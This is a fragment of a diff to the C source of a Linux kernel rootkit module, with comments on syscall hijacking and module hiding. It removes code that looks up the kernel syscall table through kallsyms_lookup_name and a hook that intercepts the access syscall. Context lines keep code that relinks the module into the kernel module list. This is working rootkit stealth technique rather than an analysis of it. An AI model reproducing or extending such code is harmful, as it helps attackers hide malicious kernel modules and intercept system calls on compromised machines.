@@ -10,9 +10,7 @@ static struct proc_dir_entry *proc_rootkit;
 
 // Vars for syscall hijacking
 static unsigned long *syscall_table;
-
-typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
-static sys_call_ptr_t orig_access;
+sys_call_ptr_t orig_access;
 
 // Module hiding
 
@@ -31,19 +29,6 @@ void module_unhide(void)
         return;
     list_add(&THIS_MODULE->list, module_list);
     module_hidden = 0;
-}
-
-unsigned long *find_syscall_table(void)
-{
-    return (unsigned long *)kallsyms_lookup_name("sys_call_table");
-}
-
-asmlinkage long rk_access(const struct pt_regs *pt_regs)
-{
-    const char __user *filename = (const char __user *)pt_regs->di;
-    int mode = (int)pt_regs->si;
-    // pr_info("Access: %s\n", filename);
-    return orig_access(pt_regs);
 }
 
 // Proc file interface
